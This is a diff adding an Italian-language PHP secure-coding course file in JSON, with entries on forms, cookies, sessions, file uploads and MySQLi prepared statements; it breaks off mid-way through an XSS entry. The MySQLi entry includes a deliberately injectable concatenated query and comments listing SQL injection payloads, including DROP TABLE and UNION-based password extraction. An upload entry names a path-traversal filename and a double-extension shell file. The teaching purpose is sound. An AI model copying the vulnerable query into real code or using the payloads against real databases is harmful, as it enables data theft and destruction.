@@ -1,0 +1,664 @@
+{
+  "course_name": "PHP",
+  "version": "1.0",
+  "last_updated": "2025-11-14",
+  "metadata": {
+    "total_descriptors": 15,
+    "security_focus": "OWASP Top 10",
+    "compliance": "PSR-12 coding standards",
+    "topics_covered": [
+      "Form Validation",
+      "XSS Prevention",
+      "SQL Injection Protection",
+      "Session Security",
+      "File Upload Security",
+      "Cookie Security",
+      "Authentication",
+      "Input Sanitization",
+      "Output Encoding",
+      "Database Security"
+    ]
+  },
+  "concept_descriptors": [
+    {
+      "concept_id": "PHP-BASICS-001",
+      "topic": "Fondamenti PHP: Variabili, Tipi e Operatori",
+      "category": "Fundamentals",
+      "difficulty_level": "beginner",
+      "explanation": "PHP è un linguaggio lato server che elabora richieste HTTP e genera risposte dinamiche. Le variabili iniziano con $, sono tipizzate dinamicamente e supportano stringhe, numeri, boolean, array e oggetti. Gli operatori includono aritmetici (+, -, *, /), confronto (==, !=, <, >) e logici (&&, ||, !). La convenzione del corso privilegia == e != con tipi normalizzati, riservando === e !== solo per contesti critici di sicurezza o quando il tipo è parte del contratto API.",
+      "code_example": "<?php\n// Variabili e tipi\n$nome = 'Ada';           // string\n$eta = 25;               // int\n$attivo = true;          // bool\n$prezzi = [10.0, 12.5];  // array\n\n// Operatori di confronto (convenzione corso: == con tipi normalizzati)\n$metodo = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');\nif ($metodo == 'POST') {\n    // Processa POST - tipo già normalizzato a string\n}\n\n// Caso specifico per === : verifica esito file_put_contents\n$bytes = file_put_contents('file.txt', 'data');\nif ($bytes === false) {\n    // NECESSARIO: distinguere false (errore) da 0 (0 bytes scritti)\n    exit('Errore scrittura');\n}\n?>",
+      "security_notes": [
+        "Normalizzare sempre i tipi prima dei confronti (es. strtoupper per metodi HTTP)",
+        "Usare === solo quando necessario (verifiche API, hashing, falsi ambigui)",
+        "Non fidarsi mai dei valori delle superglobali ($_GET, $_POST, $_COOKIE) senza validazione",
+        "Evitare strict_types=1 negli esempi didattici per compatibilità"
+      ],
+      "common_mistakes": [
+        "Confrontare stringhe e numeri senza normalizzazione",
+        "Usare variabili non inizializzate senza controllo (use ?? operator)",
+        "Non validare i tipi quando ricevuti da input utente",
+        "Abusare di === quando non serve distinzione di tipo"
+      ],
+      "best_practices": [
+        "Usare null coalescing operator (??) per valori di default sicuri",
+        "Normalizzare tipi esplicitamente: (int), (string), trim(), strtoupper()",
+        "Commentare esplicitamente ogni uso di === con motivazione tecnica",
+        "Seguire PSR-12 per stile del codice"
+      ],
+      "learning_objectives": [
+        "Comprendere il sistema di tipi dinamici di PHP",
+        "Applicare la convenzione di confronto del corso",
+        "Distinguere quando usare == vs ===",
+        "Gestire variabili non inizializzate in modo sicuro"
+      ],
+      "related_concepts": [
+        "PHP-FORMS-001",
+        "PHP-SECURITY-INPUT-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-FORMS-001",
+      "topic": "Form Processing e Validazione Server-Side",
+      "category": "Web Development",
+      "difficulty_level": "intermediate",
+      "explanation": "Il processing dei form in PHP avviene tramite le superglobali $_POST (form method=POST) e $_GET (query string). La validazione lato server è OBBLIGATORIA anche con validazione HTML5, perché il client può essere manipolato. Le tecniche includono: verifica esistenza campi con ?? operator, normalizzazione con trim(), validazione formato con regex o filter_var(), e sanitizzazione output con htmlspecialchars() per prevenire XSS. Il pattern PRG (Post/Redirect/Get) previene doppi submit.",
+      "code_example": "<?php\n// esempi/processa.php - Validazione email sicura\n\n/**\n * PROCESSING FORM SICURO\n * 1. Recupera input da $_POST\n * 2. Normalizza (trim, controllo tipo)\n * 3. Valida formato con regex\n * 4. Sanitizza output con htmlspecialchars\n */\n\n// Step 1-2: Recupero e normalizzazione\n$email = $_POST['email'] ?? null;\nif (is_string($email)) {\n    $email = trim($email);\n}\n\n// Step 3: Validazione con regex semplice\nif ($email === null || $email === '' || \n    !preg_match('/^[^@\\s]+@[^@\\s]+\\.[^@\\s]+$/', $email)) {\n    // IMPORTANTE: HTTP 400 per input invalido\n    header('HTTP/1.1 400 Bad Request', true, 400);\n    exit('Email non valida: inserire indirizzo valido');\n}\n\n// Step 4: Output sicuro con sanitizzazione XSS\necho 'Email validata: ' . htmlspecialchars($email, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');\n\n// PATTERN PRG (Post/Redirect/Get) - previene doppio submit\n// Dopo elaborazione POST, redirect a pagina conferma:\n// header('Location: /grazie.html', true, 303);\n// exit;\n?>",
+      "security_notes": [
+        "XSS Prevention: SEMPRE usare htmlspecialchars() su output derivato da input utente",
+        "Validazione lato server OBBLIGATORIA: HTML5 validation è bypassabile",
+        "HTTP Status codes appropriati: 400 Bad Request per input invalido",
+        "Pattern PRG previene re-submit accidentale con F5",
+        "Non esporre dettagli tecnici nei messaggi di errore (information leakage)",
+        "HTTPS obbligatorio in produzione per proteggere dati in transito"
+      ],
+      "common_mistakes": [
+        "Validare solo lato client (JavaScript disabilitabile)",
+        "Echo diretto di $_POST senza htmlspecialchars (vulnerabilità XSS)",
+        "Non normalizzare input con trim() (spazi causano validazioni fallite)",
+        "Ignorare il tipo di dato (is_string check essenziale)",
+        "Non gestire campi mancanti (causa notice/warning PHP)"
+      ],
+      "best_practices": [
+        "Usare filter_var(FILTER_VALIDATE_EMAIL) per validazione email robusta",
+        "Separare logica validazione da presentazione (pattern MVC)",
+        "Loggare tentativi di input invalido per monitoraggio sicurezza",
+        "Implementare CSRF protection con token in sessione",
+        "Validare TUTTI i campi anche se 'opzionali' (whitelist approach)",
+        "Content-Security-Policy header per difesa XSS avanzata"
+      ],
+      "learning_objectives": [
+        "Processare form POST/GET in modo sicuro",
+        "Implementare validazione server-side completa",
+        "Prevenire attacchi XSS con output encoding",
+        "Applicare pattern PRG per UX migliore",
+        "Gestire errori con HTTP status appropriati"
+      ],
+      "related_concepts": [
+        "PHP-SECURITY-XSS-001",
+        "PHP-SESSION-001",
+        "PHP-SECURITY-CSRF-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-ARRAY-001",
+      "topic": "Array Indicizzati e Associativi",
+      "category": "Data Structures",
+      "difficulty_level": "beginner",
+      "explanation": "PHP supporta array indicizzati (chiavi numeriche automatiche) e associativi (chiavi stringa). Gli array sono dinamici e possono contenere tipi misti. Operazioni comuni: creazione con sintassi [] o array(), accesso con $arr[key], iterazione con cicli for/while. Il capitolo enfatizza approccio imperativo con cicli tradizionali per chiarezza didattica, evitando funzioni di ordine superiore (array_map, array_filter) per principianti.",
+      "code_example": "<?php\n// ARRAY INDICIZZATI - Pattern trasformazione/filtro/somma\n$prezzi = [10.0, 12.5, 8.9, 15.0];\n$iva = 0.22;\n\n// 1. Trasformazione: calcola prezzi con IVA\n$conIva = [];\nfor ($i = 0; $i < count($prezzi); $i++) {\n    $prezzoOriginale = $prezzi[$i];\n    // round() previene errori floating-point\n    $prezzoIvato = round($prezzoOriginale * (1 + $iva), 2);\n    $conIva[$i] = $prezzoIvato;\n}\n\n// 2. Filtro: mantieni solo prezzi > 12\n$filtrati = [];\nfor ($i = 0; $i < count($conIva); $i++) {\n    if ($conIva[$i] > 12) {\n        $filtrati[] = $conIva[$i];\n    }\n}\n\n// 3. Riduzione: somma totale\n$somma = 0.0;\nfor ($i = 0; $i < count($filtrati); $i++) {\n    $somma += $filtrati[$i];\n}\n\necho number_format($somma, 2, ',', '.');\n\n// ARRAY ASSOCIATIVI - Chiavi descrittive\n$prezziAssoc = [\n    'A' => 10.0,\n    'B' => 12.5,\n    'C' => 8.9,\n    'D' => 15.0,\n];\n\n// Iterazione con array_keys per mantenere associazioni\n$chiavi = array_keys($prezziAssoc);\n$conIvaAssoc = [];\nfor ($i = 0; $i < count($chiavi); $i++) {\n    $k = $chiavi[$i];\n    $conIvaAssoc[$k] = round($prezziAssoc[$k] * (1 + $iva), 2);\n}\n?>",
+      "security_notes": [
+        "Validare sempre chiavi array se provenienti da input utente",
+        "Usare isset() o array_key_exists() prima di accedere a chiavi incerte",
+        "Sanitizzare valori array prima di output HTML",
+        "Limitare dimensione array da input utente (DoS prevention)",
+        "Non usare extract() su dati utente (variable injection risk)"
+      ],
+      "common_mistakes": [
+        "Accedere a indici non esistenti senza controllo (undefined index notice)",
+        "Modificare array durante iterazione (comportamenti imprevedibili)",
+        "count() dentro condizione loop (ricalcolo a ogni iterazione, inefficiente)",
+        "Confondere [] (append) con [index] = (assegnazione)"
+      ],
+      "best_practices": [
+        "Precalcolare count($array) fuori dal ciclo for performance",
+        "Usare chiavi significative negli array associativi",
+        "Preferire foreach per readability quando non serve indice esplicito",
+        "Commentare logica complessa di trasformazioni array",
+        "Validare dati numerici prima di operazioni matematiche"
+      ],
+      "learning_objectives": [
+        "Distinguere array indicizzati da associativi",
+        "Implementare pattern trasformazione/filtro/riduzione con cicli",
+        "Manipolare array mantenendo chiavi descrittive",
+        "Applicare operazioni matematiche su array in modo sicuro"
+      ],
+      "related_concepts": [
+        "PHP-BASICS-001",
+        "PHP-SECURITY-INPUT-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-COOKIE-001",
+      "topic": "Cookie Sicuri con Flag di Protezione",
+      "category": "Web Security",
+      "difficulty_level": "intermediate",
+      "explanation": "I cookie in PHP si impostano con setcookie() e si leggono da $_COOKIE. Per sicurezza sono essenziali i flag: secure (solo HTTPS), httponly (blocca accesso JavaScript, previene XSS), samesite (Strict/Lax, mitiga CSRF). I cookie possono memorizzare preferenze non sensibili (tema, lingua) o token di sessione. Serializzare dati strutturati con json_encode(), validare sempre valori letti con filter_var o regex.",
+      "code_example": "<?php\n/**\n * COOKIE SICURI - Configurazione completa\n * Flag essenziali per prevenire XSS, CSRF, session hijacking\n */\n\n// Serializzazione dati strutturati per storage sicuro\n$preferenze = ['tema' => 'scuro', 'lingua' => 'it'];\n$valore = json_encode($preferenze);\n\n// setcookie con array opzioni (PHP 7.3+)\nsetcookie('preferenze', $valore, [\n    'expires' => time() + 3600 * 24 * 30,  // 30 giorni\n    'path' => '/',                          // Intero dominio\n    'domain' => '',                         // Dominio corrente\n    'secure' => true,                       // HTTPS only (OBBLIGATORIO in produzione)\n    'httponly' => true,                     // Blocca JavaScript (previene XSS)\n    'samesite' => 'Strict',                 // Limita invii cross-site (mitiga CSRF)\n]);\n\n// LETTURA COOKIE SICURA con validazione\n$cookieRaw = $_COOKIE['preferenze'] ?? null;\nif ($cookieRaw !== null) {\n    // Decode JSON con controllo errori\n    $dati = json_decode($cookieRaw, true);\n    if (json_last_error() === JSON_ERROR_NONE && is_array($dati)) {\n        // Validazione whitelist per tema\n        $temaValidi = ['chiaro', 'scuro'];\n        $tema = $dati['tema'] ?? 'chiaro';\n        if (!in_array($tema, $temaValidi, true)) {\n            $tema = 'chiaro';  // Fallback sicuro\n        }\n        // Output sanitizzato\n        echo 'Tema: ' . htmlspecialchars($tema, ENT_QUOTES, 'UTF-8');\n    }\n}\n\n// COOKIE DI SESSIONE per autenticazione\nsession_set_cookie_params([\n    'lifetime' => 0,          // Session cookie (browser close)\n    'path' => '/',\n    'domain' => '',\n    'secure' => isset($_SERVER['HTTPS']),\n    'httponly' => true,       // OBBLIGATORIO per session cookie\n    'samesite' => 'Strict',   // Massima protezione CSRF\n]);\nsession_start();\n?>",
+      "security_notes": [
+        "secure=true OBBLIGATORIO in produzione (HTTPS only)",
+        "httponly=true SEMPRE per cookie di sessione (previene XSS cookie theft)",
+        "samesite=Strict per massima protezione CSRF (Lax se servono link esterni)",
+        "Validare e sanitizzare TUTTI i valori letti da $_COOKIE",
+        "Limitare dimensione cookie (max 4KB, evita DoS)",
+        "Non memorizzare dati sensibili nei cookie (preferire sessioni server-side)",
+        "Impostare cookie prima di qualsiasi output HTML (headers already sent error)"
+      ],
+      "common_mistakes": [
+        "Dimenticare secure flag in produzione (cookie trasmesso su HTTP insicuro)",
+        "Non impostare httponly per session cookie (vulnerabile a XSS)",
+        "Usare samesite=None senza necessità (espone a CSRF)",
+        "Trustare valori $_COOKIE senza validazione (injection risk)",
+        "Impostare cookie dopo output HTML (headers already sent)",
+        "Dimensione cookie eccessiva (alcuni browser limitano a 4KB)"
+      ],
+      "best_practices": [
+        "Cifrare cookie sensibili con OpenSSL prima di setcookie()",
+        "Implementare CSRF token in sessione per operazioni critiche",
+        "Ruotare session ID dopo login (session_regenerate_id)",
+        "Loggare accessi anomali con cookie manipolati",
+        "Usare HttpOnly session cookies per autenticazione",
+        "Testare compatibilità samesite su browser target"
+      ],
+      "learning_objectives": [
+        "Configurare cookie con flag di sicurezza completi",
+        "Distinguere quando usare Strict vs Lax per samesite",
+        "Serializzare e validare dati strutturati in cookie",
+        "Comprendere relazione cookie/sessioni PHP"
+      ],
+      "related_concepts": [
+        "PHP-SESSION-001",
+        "PHP-SECURITY-XSS-001",
+        "PHP-SECURITY-CSRF-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-SESSION-001",
+      "topic": "Sessioni Sicure e Prevenzione Session Fixation",
+      "category": "Web Security",
+      "difficulty_level": "intermediate",
+      "explanation": "Le sessioni PHP mantengono stato tra richieste tramite cookie PHPSESSID che identifica contesto server-side. Sicurezza essenziale: configurare cookie con httponly/secure/samesite, abilitare session.use_strict_mode, rigenerare ID dopo login (session_regenerate_id), implementare timeout inattività. Session fixation: attacco dove attaccante forza session ID nota alla vittima. Prevenzione: rigenerare ID a ogni cambio privilegi.",
+      "code_example": "<?php\n/**\n * SESSIONI SICURE - esempi/session_demo.php\n * Configurazione completa con protezioni session fixation e timeout\n */\n\n// Configurazione cookie sessione con flag sicurezza\nsession_start([\n    'cookie_httponly' => true,     // OBBLIGATORIO: blocca JavaScript\n    'cookie_secure' => false,      // Metti true su HTTPS in produzione\n    'cookie_samesite' => 'Lax',    // Lax per compatibilità link esterni\n]);\n\n// PREVENZIONE SESSION FIXATION\n// Rigenera ID alla prima richiesta\nif (!isset($_SESSION['initialized'])) {\n    session_regenerate_id(true);  // true = elimina ID vecchio\n    $_SESSION['initialized'] = true;\n    $_SESSION['created_at'] = time();\n}\n\n// TIMEOUT INATTIVITÀ (20 minuti)\n$timeoutSeconds = 20 * 60;\n$now = time();\nif (isset($_SESSION['last_activity'])) {\n    $inactive = $now - (int)$_SESSION['last_activity'];\n    if ($inactive > $timeoutSeconds) {\n        // Sessione scaduta: distruggi e ricrea\n        session_unset();\n        session_destroy();\n        session_start([\n            'cookie_httponly' => true,\n            'cookie_secure' => false,\n            'cookie_samesite' => 'Lax',\n        ]);\n        session_regenerate_id(true);\n        $_SESSION['initialized'] = true;\n        $_SESSION['msg'] = 'Sessione scaduta per inattività';\n    }\n}\n$_SESSION['last_activity'] = $now;\n\n// Esempio: contatore visite\nif (!isset($_SESSION['counter'])) {\n    $_SESSION['counter'] = 0;\n}\n$_SESSION['counter']++;\n\necho 'Visite: ' . (int)$_SESSION['counter'];\n\n// LOGOUT SICURO - auth/logout.php pattern\nfunction logout_sicuro() {\n    session_start();\n    $_SESSION = [];  // Svuota array sessione\n    \n    // Distruggi cookie di sessione\n    if (ini_get('session.use_cookies')) {\n        $params = session_get_cookie_params();\n        setcookie(session_name(), '', time() - 42000,\n            $params['path'], $params['domain'],\n            $params['secure'], $params['httponly']\n        );\n    }\n    \n    session_destroy();\n    header('Location: /login.php', true, 303);\n    exit;\n}\n\n// PATTERN LOGIN SICURO\nfunction login_sicuro($user_id) {\n    // CRITICO: Rigenera ID dopo autenticazione\n    session_regenerate_id(true);\n    $_SESSION['user_id'] = $user_id;\n    $_SESSION['authenticated'] = true;\n    $_SESSION['login_time'] = time();\n    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';\n}\n?>",
+      "security_notes": [
+        "session_regenerate_id(true) OBBLIGATORIO dopo login (previene session fixation)",
+        "cookie_httponly=true SEMPRE per PHPSESSID (previene XSS theft)",
+        "session.use_strict_mode=1 rifiuta session ID non generate dal server",
+        "Implementare timeout inattività (max 20-30 min per app sensibili)",
+        "Validare IP/User-Agent per rilevare session hijacking (opzionale, problemi proxy)",
+        "Distruggere completamente sessione al logout (session_destroy + cookie delete)",
+        "HTTPS obbligatorio in produzione (PHPSESSID su HTTP = hijacking facile)"
+      ],
+      "common_mistakes": [
+        "Non rigenerare ID dopo login (vulnerabile a session fixation)",
+        "Dimenticare cookie_httponly (PHPSESSID leggibile da JavaScript via XSS)",
+        "session_destroy() senza eliminare cookie (sessione riutilizzabile)",
+        "Timeout assente o troppo lungo (sessioni zombie sfruttabili)",
+        "Salvare password in sessione (usare solo ID utente)",
+        "Non gestire concorrenza sessioni (race conditions su write)"
+      ],
+      "best_practices": [
+        "Usare session_set_cookie_params() prima di session_start()",
+        "Rigenerare ID periodicamente anche durante navigazione (es. ogni 10 min)",
+        "Memorizzare solo dati essenziali in sessione (user_id, ruolo)",
+        "Loggare login/logout per audit trail",
+        "Implementare CSRF token in sessione per form critici",
+        "Testare comportamento con cookie bloccati (graceful degradation)",
+        "Storage sessioni: preferire Redis/Memcached per scalabilità"
+      ],
+      "learning_objectives": [
+        "Configurare sessioni PHP con sicurezza completa",
+        "Prevenire session fixation con rigenerazione ID",
+        "Implementare timeout inattività robusto",
+        "Gestire login/logout in modo sicuro"
+      ],
+      "related_concepts": [
+        "PHP-COOKIE-001",
+        "PHP-AUTH-001",
+        "PHP-SECURITY-CSRF-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-UPLOAD-001",
+      "topic": "Upload File Sicuro con Validazione MIME",
+      "category": "Web Security",
+      "difficulty_level": "advanced",
+      "explanation": "L'upload file in PHP usa la superglobale $_FILES con metadati (name, tmp_name, size, error, type). Sicurezza critica: NON fidarsi di $_FILES['type'] (fornito dal client, facilmente spoofato). Validazione corretta: 1) Verificare $_FILES['error'] === UPLOAD_ERR_OK, 2) Controllare dimensione max, 3) Rilevare MIME reale con finfo_file(), 4) Whitelist estensioni permesse, 5) Salvare fuori document root con nome randomizzato (bin2hex(random_bytes)), 6) Usare move_uploaded_file() (unica funzione sicura).",
+      "code_example": "<?php\n/**\n * UPLOAD FILE SICURO - esempi/upload.php\n * Protezioni: MIME validation, size limit, filename randomization\n */\n\nsession_start();  // Per eventuali validazioni CSRF\n\n// STEP 1: Verifica upload riuscito\nif (!isset($_FILES['documento']) || $_FILES['documento']['error'] !== UPLOAD_ERR_OK) {\n    header('HTTP/1.1 400 Bad Request', true, 400);\n    exit('Upload non valido - controllare file e dimensione');\n}\n\n$tmp = $_FILES['documento']['tmp_name'];\n$size = (int)$_FILES['documento']['size'];\n\n// STEP 2: Limite dimensione (2MB)\nif ($size > 2 * 1024 * 1024) {\n    header('HTTP/1.1 413 Payload Too Large', true, 413);\n    exit('File troppo grande (max 2MB)');\n}\n\n// STEP 3: MIME TYPE DETECTION REALE (non trustare $_FILES['type']!)\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $tmp);\nfinfo_close($finfo);\n\nif ($mime === false) {\n    $mime = 'application/octet-stream';  // Fallback\n}\n\n// STEP 4: WHITELIST tipi permessi\n$allowed = [\n    'application/pdf',\n    'image/png',\n    'image/jpeg',\n    'text/plain',\n];\n\nif (!in_array($mime, $allowed, true)) {\n    header('HTTP/1.1 415 Unsupported Media Type', true, 415);\n    exit('Tipo file non consentito. Permessi: PDF, PNG, JPEG, TXT');\n}\n\n// STEP 5: Directory upload FUORI document root (best practice)\n// In produzione: /var/uploads o simile\n$destDir = __DIR__ . '/uploads';\nif (!is_dir($destDir)) {\n    @mkdir($destDir, 0755, true);  // Crea con permessi restrittivi\n}\n\n// STEP 6: Filename randomizzato (previene directory traversal)\n$randomName = bin2hex(random_bytes(16));  // 32 caratteri hex\n$extension = match($mime) {\n    'application/pdf' => 'pdf',\n    'image/png' => 'png',\n    'image/jpeg' => 'jpg',\n    'text/plain' => 'txt',\n    default => 'bin',\n};\n$dest = $destDir . '/' . $randomName . '.' . $extension;\n\n// STEP 7: Spostamento sicuro (UNICA funzione valida!)\nif (!move_uploaded_file($tmp, $dest)) {\n    error_log(\"Upload failed: move_uploaded_file to $dest\");\n    header('HTTP/1.1 500 Internal Server Error', true, 500);\n    exit('Spostamento file fallito');\n}\n\n// Success - Log e risposta\nerror_log(\"Upload success: $randomName.$extension - MIME: $mime - Size: $size bytes\");\necho json_encode([\n    'status' => 'success',\n    'file_id' => $randomName,\n    'mime' => $mime,\n    'size' => $size,\n]);\n\n/**\n * CONFIGURAZIONE PHP.INI per upload sicuri:\n * \n * upload_max_filesize = 2M\n * post_max_size = 3M\n * file_uploads = On\n * upload_tmp_dir = /tmp  (o directory dedicata)\n * max_file_uploads = 5\n */\n?>",
+      "security_notes": [
+        "CRITICO: NON trustare $_FILES['type'] - è fornito dal client e facilmente spoofato",
+        "Usare finfo_file() per MIME detection reale basata su magic numbers",
+        "Whitelist rigorosa di MIME types permessi (blacklist non sufficiente)",
+        "Filename randomizzato previene directory traversal e collisioni",
+        "move_uploaded_file() è l'UNICA funzione sicura (verifica origin del file)",
+        "Salvare file FUORI document root per prevenire esecuzione diretta",
+        "Limiti dimensione server-side (php.ini: upload_max_filesize, post_max_size)",
+        "Permessi filesystem restrittivi: 0644 per file, 0755 per directory",
+        "Anti-virus scan su file uploadati (ClamAV in produzione)",
+        "Rate limiting su endpoint upload (previeni DoS)"
+      ],
+      "common_mistakes": [
+        "Trustare $_FILES['type'] invece di finfo_file() (MIME spoofing)",
+        "Usare $_FILES['name'] direttamente come filename (directory traversal: ../../etc/passwd)",
+        "Verificare estensione invece di MIME type (bypass con double extension: shell.php.jpg)",
+        "Salvare file in document root con nomi predittibili (esecuzione RCE)",
+        "Non controllare $_FILES['error'] (upload parziali passano come validi)",
+        "Usare copy() o rename() invece di move_uploaded_file() (insicuro)",
+        "Dimenticare CSRF token su form upload (upload non autorizzati)"
+      ],
+      "best_practices": [
+        "Implementare quarantena: virus scan prima di move definitivo",
+        "Limitare numero upload concorrenti per IP (rate limiting)",
+        "Generare URL di download temporanei con token (evita hotlinking)",
+        "Loggare tutti gli upload con IP, timestamp, MIME, size",
+        "Implementare CSRF protection con token in form",
+        "Usare storage cloud (S3, Google Cloud) per scalabilità",
+        "Chunked upload per file grandi (evita timeout)",
+        "Cleanup periodico file orfani o scaduti"
+      ],
+      "learning_objectives": [
+        "Implementare upload file con validazioni complete",
+        "Distinguere MIME detection sicura da insicura",
+        "Prevenire directory traversal e RCE via upload",
+        "Configurare limiti e permessi appropriati"
+      ],
+      "related_concepts": [
+        "PHP-SECURITY-FILE-001",
+        "PHP-SECURITY-CSRF-001",
+        "PHP-FILE-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-MYSQLI-001",
+      "topic": "Database MySQLi con Prepared Statements",
+      "category": "Database Security",
+      "difficulty_level": "intermediate",
+      "explanation": "L'estensione mysqli fornisce API object-oriented per MySQL/MariaDB. Sicurezza CRITICA: usare SEMPRE prepared statements con bind_param() per prevenire SQL injection. Query preparate separano logica SQL da dati, impedendo manipolazione della struttura query. Workflow: 1) $stmt = $mysqli->prepare('SELECT ... WHERE x = ?'), 2) $stmt->bind_param('s', $var), 3) $stmt->execute(), 4) $result = $stmt->get_result(). Carattere tipo binding: 's' string, 'i' integer, 'd' double, 'b' blob.",
+      "code_example": "<?php\n/**\n * DATABASE MYSQLI SICURO\n * Confronto: query NON sicura vs prepared statement sicuro\n */\n\n// CONNESSIONE SICURA\n$mysqli = new mysqli('localhost', 'user', 'pass', 'database');\n\n// Verifica connessione\nif ($mysqli->connect_errno) {\n    error_log('DB connect error: ' . $mysqli->connect_error);\n    header('HTTP/1.1 503 Service Unavailable', true, 503);\n    exit('Database temporaneamente non disponibile');\n}\n\n// OBBLIGATORIO: charset utf8mb4 (previene vulnerabilità encoding)\n$mysqli->set_charset('utf8mb4');\n\n// ============================================\n// ESEMPIO NON SICURO - SQL INJECTION VULNERABLE\n// ============================================\n$email = $_GET['email'] ?? '';\n\n// VULNERABILE: concatenazione diretta input utente\n$sqlUnsafe = \"SELECT id, name FROM users WHERE email = '\" . $email . \"'\";\n$result = $mysqli->query($sqlUnsafe);\n\n/**\n * ATTACK VECTOR - Input malevolo:\n * $email = \"x' OR '1'='1\"\n * SQL risultante: SELECT id, name FROM users WHERE email = 'x' OR '1'='1'\n * Risultato: ritorna TUTTI gli utenti (bypass autenticazione)\n * \n * Altri payloads:\n * - admin'-- (comment out resto query)\n * - x'; DROP TABLE users;-- (SQL injection distruttivo)\n * - x' UNION SELECT password, null FROM users-- (data leakage)\n */\n\n// ============================================\n// VERSIONE SICURA - PREPARED STATEMENT\n// ============================================\n$email = $_GET['email'] ?? '';\n\n// Step 1: Prepare con placeholder ?\n$stmt = $mysqli->prepare('SELECT id, name, email FROM users WHERE email = ?');\nif (!$stmt) {\n    error_log('Prepare failed: ' . $mysqli->error);\n    exit('Errore query');\n}\n\n// Step 2: Bind parametro ('s' = string)\n$stmt->bind_param('s', $email);\n\n// Step 3: Execute\n$stmt->execute();\n\n// Step 4: Get result\n$result = $stmt->get_result();\n\n// Step 5: Fetch e output sicuro\nwhile ($row = $result->fetch_assoc()) {\n    // Output sanitizzato per HTML\n    echo htmlspecialchars($row['name'], ENT_QUOTES, 'UTF-8') . '<br>';\n}\n\n$stmt->close();\n\n// ============================================\n// INSERT SICURO con prepared statement\n// ============================================\n$nome = $_POST['nome'] ?? '';\n$email = $_POST['email'] ?? '';\n\n// Validazione input\nif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {\n    exit('Email invalida');\n}\n\n$stmt = $mysqli->prepare('INSERT INTO users (nome, email) VALUES (?, ?)');\nif (!$stmt) {\n    error_log('Prepare INSERT failed: ' . $mysqli->error);\n    exit('Errore inserimento');\n}\n\n// Bind multipli parametri: 'ss' = 2 stringhe\n$stmt->bind_param('ss', $nome, $email);\n\nif (!$stmt->execute()) {\n    error_log('Execute failed: ' . $stmt->error);\n    exit('Inserimento fallito');\n}\n\nprintf('Utente inserito con ID: %d', $stmt->insert_id);\n$stmt->close();\n\n// ============================================\n// TRANSAZIONI per operazioni atomiche\n// ============================================\n$mysqli->begin_transaction();\n\ntry {\n    // Trasferimento fondi: operazione atomica\n    $stmt = $mysqli->prepare('UPDATE accounts SET balance = balance - ? WHERE id = ?');\n    $stmt->bind_param('di', $amount, $fromId);\n    $stmt->execute();\n    \n    $stmt = $mysqli->prepare('UPDATE accounts SET balance = balance + ? WHERE id = ?');\n    $stmt->bind_param('di', $amount, $toId);\n    $stmt->execute();\n    \n    // Tutto ok: commit\n    $mysqli->commit();\n    echo 'Trasferimento completato';\n    \n} catch (Throwable $e) {\n    // Errore: rollback\n    $mysqli->rollback();\n    error_log('Transaction failed: ' . $e->getMessage());\n    exit('Operazione annullata');\n}\n\n$mysqli->close();\n?>",
+      "security_notes": [
+        "SQL Injection: usare SEMPRE prepared statements, mai concatenare input utente",
+        "charset utf8mb4 OBBLIGATORIO (utf8 limitato, vulnerabilità encoding)",
+        "Parametri bind separano dati da struttura query (elimina injection)",
+        "Validare input PRIMA di passare a bind_param (defense in depth)",
+        "Non esporre dettagli errori SQL all'utente (error_log per logging)",
+        "Transazioni per operazioni multi-step critiche (atomicity)",
+        "Least privilege: utente DB con permessi minimi necessari",
+        "Prepared statements prevengono anche performance issues (query caching)"
+      ],
+      "common_mistakes": [
+        "Concatenare variabili in SQL string (SQL injection critica)",
+        "Usare mysqli_real_escape_string invece di prepared statements (insufficiente)",
+        "Dimenticare set_charset('utf8mb4') (vulnerabilità encoding-based)",
+        "Non controllare $stmt === false dopo prepare (query malformate)",
+        "Esporre $mysqli->error in output utente (information disclosure)",
+        "Transazioni senza try/catch (commit parziali inconsistenti)",
+        "Riusare prepared statement senza re-bind (valori stale)"
+      ],
+      "best_practices": [
+        "Centralizzare connessioni DB in classe/funzione singleton",
+        "Usare PDO per portabilità multi-database (alternativa mysqli)",
+        "Implementare connection pooling per performance",
+        "Indici appropriati su colonne WHERE/JOIN",
+        "EXPLAIN query complesse per ottimizzazione",
+        "Limitare risultati con LIMIT (previeni DoS su tabelle grandi)",
+        "Audit logging per operazioni critiche (INSERT/UPDATE/DELETE)",
+        "Backup regolari e disaster recovery plan"
+      ],
+      "learning_objectives": [
+        "Implementare query sicure con prepared statements",
+        "Comprendere meccanismi SQL injection e prevenzione",
+        "Gestire transazioni per operazioni atomiche",
+        "Configurare connessioni DB con charset corretto"
+      ],
+      "related_concepts": [
+        "PHP-SECURITY-SQLI-001",
+        "PHP-AUTH-001",
+        "PHP-FORMS-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-SECURITY-XSS-001",
+      "topic": "Prevenzione Cross-Site Scripting (XSS)",
+      "category": "Web Security",
+      "difficulty_level": "intermediate",
+      "explanation": "XSS (Cross-Site Scripting) è l'iniezione di script malevoli in pagine web visualizzate da altri utenti. Tre tipi: Reflected (payload in URL/form, riflesso immediatamente), Stored (payload salvato in DB, eseguito a ogni caricamento), DOM-based (manipolazione JavaScript client-side). Prevenzione: output encoding con htmlspecialchars(ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') su TUTTI i dati derivati da input utente, Content-Security-Policy header per bloccare inline scripts, validazione input con whitelist.",
